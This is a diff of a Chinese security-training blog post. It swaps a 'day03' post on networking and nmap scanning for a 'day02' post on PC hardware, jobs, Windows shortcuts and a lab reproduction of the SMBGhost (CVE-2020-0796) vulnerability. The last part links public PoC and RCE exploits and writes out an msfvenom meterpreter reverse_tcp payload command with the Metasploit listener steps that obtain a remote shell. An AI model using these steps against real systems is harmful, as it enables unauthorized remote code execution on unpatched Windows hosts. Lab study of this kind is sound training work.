@@ -3,9 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="referrer" content="no-referrer" />
-  <title>day03.计算机网络基础与nmap端口扫描 | bulaize2023</title>
-  <meta name="keywords" content=" 计算机网络 , nmap ">
-  <meta name="description" content="day03.计算机网络基础与nmap端口扫描 | bulaize2023">
+  <title>day02 | bulaize2023</title>
+  <meta name="keywords" content=" day02 ">
+  <meta name="description" content="day02 | bulaize2023">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="在小皮面板打开MySQL并找到MySQL的bin目录下输入cmd打开命令行  输入mysql -u用户名 -p密码，连接数据库  使用show databases;查看所有数据库  使用create database 数据库名;，创建数据库  use test;使用test数据库  show tables;查看test数据库下所有表   创建用户表 123456create table user">
 <meta property="og:type" content="article">
@@ -538,9 +538,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-day3" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-day2" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">day03.计算机网络基础与nmap端口扫描</h1>
+        <h1 class="article-title">day02</h1>
     
     <div class="article-meta">
         
@@ -558,21 +558,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color1">计算机网络</a>
-            
-            <a class="color5">nmap</a>
+            <a class="color1">day02</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-07-12 20:16:29'>2024-07-11 19:11</time>
+            发布时间 : <time class="date" title='最后更新: 2024-07-12 21:02:28'>2024-07-11 18:11</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:539</span>
+        <span>字数:534</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -591,7 +589,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C"><span class="toc-text">1.计算机网络</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">2.vmware三种网络连接方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8nmap%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">3.使用nmap进行端口扫描</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%94%B5%E8%84%91%E9%80%89%E6%8B%A9"><span class="toc-text">1.电脑选择</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%B0%B1%E4%B8%9A%E6%83%85%E5%86%B5"><span class="toc-text">2.就业情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Windows%E5%BF%AB%E6%8D%B7%E9%94%AE"><span class="toc-text">3.Windows快捷键</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">4.永恒之黑漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1POC-%E8%93%9D%E5%B1%8F"><span class="toc-text">4.1POC(蓝屏)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2EXP-RCE"><span class="toc-text">4.2EXP(RCE)</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -607,9 +605,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="1-计算机网络"><a href="#1-计算机网络" class="headerlink" title="1.计算机网络"></a>1.计算机网络</h1><p>通信是指人与人，人与物，物与物之间通过某种媒介和行为的信息传递和交流<br>信息传递的过程：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720615438876-e738ea23-7ec4-4051-9e1f-98b310fd5b79.png#averageHue=%23d0e4ef&clientId=u6d6c946d-90ad-4&from=paste&height=110&id=ub9208fab&originHeight=137&originWidth=725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76976&status=done&style=none&taskId=u94c19650-7907-43d0-a278-81fe5f71110&title=&width=580" alt="image.png"><br>IP地址在网络中用于表示一个节点，用于IP报文在网络中寻址<br>IP地址分为A,B,C,D四类，常用A,B,C三类<br>范围0.0.0.0-255.255.255.255<br>A类有效地址:1.0.0.1-126.255.255.254<br>B类有效地址：128.0.0.1-191.255.255.254<br>C类有效地址：192.0.0.1-223.255.255.254<br>私网地址：<br>10.0.0.0-10.255.255.255<br>172.16.0.0-172.31.255.255<br>192.168.0.0-192.168.255.255<br>ipv4与ipv6<br>ipv4表示方法为点分十进制<br>ip数量为2^32<br>ipv6表示方法为十六进制<br>ip数量为2^128</p>
-<h1 id="2-vmware三种网络连接方式"><a href="#2-vmware三种网络连接方式" class="headerlink" title="2.vmware三种网络连接方式"></a>2.vmware三种网络连接方式</h1><p>1.桥接模式：直接调用物理机的物理网卡为虚拟机分配一个真实的IP地址，虚拟机可以使用该IP与局域网内其他的物理机互相通信。<br>2.nat模式：将物理机单做一台路由器通过物理机上的虚拟网卡给虚拟机分配一个虚假的IP地址，虚拟机使用该IP地址可以实现上网，但实际上网的IP地址是物理机的IP<br>3.仅主机模式：仅主机模式的虚拟网卡仅对主机可见，并在虚拟机和主机系统之间提供网络连接。在一般情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet。</p>
-<h2 id="3-使用nmap进行端口扫描"><a href="#3-使用nmap进行端口扫描" class="headerlink" title="3.使用nmap进行端口扫描"></a>3.使用nmap进行端口扫描</h2><p>NMAP 是一款免费开源的网络扫描和主机监测工具，主要用于扫描一组主机的网络端口以及所有服务器间程序都要通过网络端口对外提供服务。比如一些常见的端口号：21（FTP服务）、22（SSH连接）、80（HTTP服务）等等，那么我们通过这些服务器开放的端口可以得到很多信息<br>nmap [ 扫描类型 ]  [ 扫描选项 ]  &lt;目标&gt;<br>例如：扫描192.168.1.55下1-1000的所有端口<br>nmap -p 1-1000 192.168.1.55<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720616968685-056f7940-08c5-453c-bfb8-b7a56d494054.png#averageHue=%2331313e&clientId=u6d6c946d-90ad-4&from=paste&height=165&id=u54509dcc&originHeight=206&originWidth=641&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39928&status=done&style=none&taskId=u5d21a77f-ec42-47e0-9998-c1e562e7f86&title=&width=512.8" alt="image.png"></p>
+        <h1 id="1-电脑选择"><a href="#1-电脑选择" class="headerlink" title="1.电脑选择"></a>1.电脑选择</h1><p>笔记本VS台式机<br>笔记本优势：便携性强<br>台式机优势：性价比高<br>性能对比：1W笔记本&#x3D;5，6k台式机<br>硬件需求：<br>CPU：至少i5推荐i7（最新一代）<br>显卡：推荐4060以上<br>内存：16G(8*2)起步，有生产力需求建议32G起步，频率DDR4至少3200以上，DRR5至少6000以上（台式机）。<br>笔记本4800频率即T1,5600即T0<br>硬盘：推荐pcie4.0固态硬盘1TB<br>系统：Windows系统分为：家庭版，专业版，企业版，专业工作站版，教育版<br>Windows服务器系统有：2003，2008，2016，2018</p>
+<h1 id="2-就业情况"><a href="#2-就业情况" class="headerlink" title="2.就业情况"></a>2.就业情况</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514051546-eca87631-b53d-4660-9c00-28ad61d11478.png#averageHue=%23353f46&clientId=u8ee61bf8-9d4a-4&from=paste&height=421&id=ufe750d83&originHeight=526&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156022&status=done&style=none&taskId=u3bc24803-50ce-4377-87d1-d5df2b18265&title=&width=1264" alt="34cf3fd3b6ef9ee557fe01dddd48702.png"></p>
+<h1 id="3-Windows快捷键"><a href="#3-Windows快捷键" class="headerlink" title="3.Windows快捷键"></a>3.Windows快捷键</h1><ul>
+<li>复制：<strong>Ctrl</strong> + <strong>C</strong></li>
+<li>剪切 <strong>：Ctrl</strong> + <strong>X</strong></li>
+</ul>
+<p>粘贴：<strong>Ctrl</strong> + <strong>V</strong></p>
+<ul>
+<li>最大化窗口<strong>：F11</strong>或<strong>Windows徽标键</strong> +<strong>向上键</strong> </li>
+<li>打开任务视图<strong>：win</strong> + <strong>Tab</strong></li>
+<li>显示和隐藏桌面<strong>：win</strong> + <strong>D</strong> </li>
+<li>在打开的应用之间切换 **：Alt **+ <strong>Tab</strong></li>
+<li>打开”快速链接”菜单<strong>：win</strong> + <strong>X</strong></li>
+<li>锁定电脑：<strong>win</strong> + <strong>L</strong></li>
+</ul>
+<h1 id="4-永恒之黑漏洞复现"><a href="#4-永恒之黑漏洞复现" class="headerlink" title="4.永恒之黑漏洞复现"></a>4.永恒之黑漏洞复现</h1><h2 id="4-1POC-蓝屏"><a href="#4-1POC-蓝屏" class="headerlink" title="4.1POC(蓝屏)"></a>4.1POC(蓝屏)</h2><p>GitHub下载工具：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514430038-dbbac0e0-5163-42cb-aa78-a5e3de3b116f.png#averageHue=%23ebd09f&clientId=u8ee61bf8-9d4a-4&from=paste&height=714&id=u3d53bbdd&originHeight=892&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119984&status=done&style=none&taskId=u799f63ec-12b1-4ae5-9eca-de1baa688e3&title=&width=1071.2" alt="image.png"><br>解压并拖入到虚拟机中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514509331-1ad8ab44-e4fc-42c6-951c-ef4c644651f0.png#averageHue=%231095eb&clientId=u8ee61bf8-9d4a-4&from=paste&height=608&id=u193074e8&originHeight=760&originWidth=960&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=293445&status=done&style=none&taskId=ue89ad2ba-3653-44d3-b399-790d4624744&title=&width=768" alt="image.png"><br>进入文件夹路径输入cmd<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514580664-ea3cc0b3-eeed-4b32-9f7c-a78b0618b9b9.png#averageHue=%23838281&clientId=u8ee61bf8-9d4a-4&from=paste&height=298&id=u760f5b41&originHeight=373&originWidth=972&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39066&status=done&style=none&taskId=u749717cb-39dd-4f9f-97a3-fcaebb8e9d3&title=&width=777.6" alt="image.png"><br>输入pip install ntlm_auth下载工具(已安装python环境)<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514653406-0bea6924-0dec-41dc-8ebb-438889fab4d3.png#averageHue=%2331302e&clientId=u8ee61bf8-9d4a-4&from=paste&height=229&id=uf03316b1&originHeight=286&originWidth=939&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37088&status=done&style=none&taskId=udd6a1a75-4f9e-4450-a93c-3ca073f3d8a&title=&width=751.2" alt="image.png"><br>输入 python CVE-2020-0796.py  192.168.1.82(靶机ip)<br>前提是两台主机要在同一局域网下且靶机关闭了杀毒软件和防火墙<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720514824950-b8695c8a-eaa7-4c95-948b-e2e262865383.png#averageHue=%230f7fd8&clientId=u8ee61bf8-9d4a-4&from=paste&height=531&id=u115b5597&originHeight=664&originWidth=985&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54494&status=done&style=none&taskId=uae6557b2-9179-4d21-b378-2141624f820&title=&width=788" alt="image.png"></p>
+<h2 id="4-2EXP-RCE"><a href="#4-2EXP-RCE" class="headerlink" title="4.2EXP(RCE)"></a>4.2EXP(RCE)</h2><p>在GitHub上下载工具<br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720515499716-b4bbadd1-7e8a-40c2-96a3-96b76c9c6f99.png#averageHue=%23f1e1b4&clientId=uc09d0013-6118-4&from=paste&height=660&id=u1bfb5855&originHeight=825&originWidth=1451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124211&status=done&style=none&taskId=u3cda2218-3e06-425d-a899-b6403425fac&title=&width=1160.8" alt="image.png"><br>将工具解压好拖入kali中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720515582510-e8a0c23b-d08f-4a69-91b6-61cbe905ad5c.png#averageHue=%23c1e8e5&clientId=uc09d0013-6118-4&from=paste&height=491&id=ue8fcda8f&originHeight=614&originWidth=1291&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119051&status=done&style=none&taskId=ue2f3bb28-8daa-4d29-a47d-561c7f10f62&title=&width=1032.8" alt="image.png"><br>利用msf生成一个反弹链接的python木马程序并生成一个exploit文件将指令全部保存进去<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.101  LPORT&#x3D;5555 -b ‘\x00’ -i 5 -f python &gt; exploit（指令中的ip地址为kaili靶机的ip）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720519691051-6a6e76d2-040d-48f7-ac82-9110eef85d05.png#averageHue=%23353740&clientId=uc09d0013-6118-4&from=paste&height=190&id=u180dd753&originHeight=237&originWidth=964&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57737&status=done&style=none&taskId=uc4597720-da30-4ab1-bf8b-1ff170c1787&title=&width=771.2" alt="image.png"><br>使用vim<br>vim exploit                    编辑文件<br>:%s&#x2F;buf&#x2F;USER_PAYLOAD        找到文件中所有的buf关键字并全部替换成 USER_PAYLOAD<br>:wq!               强制保存退出<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720519841997-03effe4f-7989-4d09-be14-1505af2f77cb.png#averageHue=%233e4048&clientId=uc09d0013-6118-4&from=paste&height=626&id=u95d44e63&originHeight=782&originWidth=699&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236752&status=done&style=none&taskId=uddfd115f-9aef-4125-880e-c6265a1966e&title=&width=559.2" alt="image.png">将exploit文件中的所有内容复制粘贴到exploit.py中去<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520012557-e4793ccd-1fb9-4e90-85ff-702c6199a43a.png#averageHue=%23252831&clientId=uc09d0013-6118-4&from=paste&height=639&id=u4b5d0fd9&originHeight=799&originWidth=1181&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=281769&status=done&style=none&taskId=u0bb50049-2e5b-418c-8091-df56c8740b7&title=&width=944.8" alt="image.png">进入msfconsole<br> <img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520132513-e08c5efe-0f8b-4e66-bd80-306d9ee314e8.png#averageHue=%2332343d&clientId=uc09d0013-6118-4&from=paste&height=460&id=u80044bb7&originHeight=575&originWidth=613&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66112&status=done&style=none&taskId=u2dd69c64-dbde-41af-b54e-88459eb828f&title=&width=490.4" alt="image.png">use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520241337-af2ec7af-6652-4383-a6d5-c4035acfae10.png#averageHue=%2332343d&clientId=uc09d0013-6118-4&from=paste&height=317&id=uffb45d96&originHeight=396&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56969&status=done&style=none&taskId=ud92d70d8-62dc-4949-b261-1cb16801e09&title=&width=662.4" alt="image.png"><br>set lhost kali的ip<br>set lport 5556<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520304834-90b5b827-a67e-4ccd-acd0-b576869b7338.png#averageHue=%2331333c&clientId=uc09d0013-6118-4&from=paste&height=319&id=u4cd6f6a9&originHeight=399&originWidth=841&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54705&status=done&style=none&taskId=u0542ef68-fb50-41c2-958a-42d78d2b6db&title=&width=672.8" alt="image.png"><br>run开始监听<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520363695-492aa2f6-096c-4cb6-b91d-15dbf387535d.png#averageHue=%232f333e&clientId=uc09d0013-6118-4&from=paste&height=62&id=ue9e7e136&originHeight=77&originWidth=484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9689&status=done&style=none&taskId=uda1a4f3b-0394-4997-af21-22daba8287e&title=&width=387.2" alt="image.png"><br>打开另一个终端页面输入python exploit.py -ip 目标ip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520467685-8556f88b-3d55-4774-8c0b-a499c76d68d0.png#averageHue=%23265076&clientId=uc09d0013-6118-4&from=paste&height=667&id=udfe560fa&originHeight=834&originWidth=1714&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204609&status=done&style=none&taskId=u53d134c6-af81-4890-81af-96aeddc8a1f&title=&width=1371.2" alt="image.png"><br>成功获取到shell数据截图<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1720520753142-9b77d64d-0ac2-4ef3-b350-268db1051a19.png#averageHue=%2331313e&clientId=uc09d0013-6118-4&from=paste&height=177&id=u4ff184be&originHeight=221&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67035&status=done&style=none&taskId=uc7505bf7-fcde-4ba3-9448-01adc69d0b0&title=&width=606.4" alt="image.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
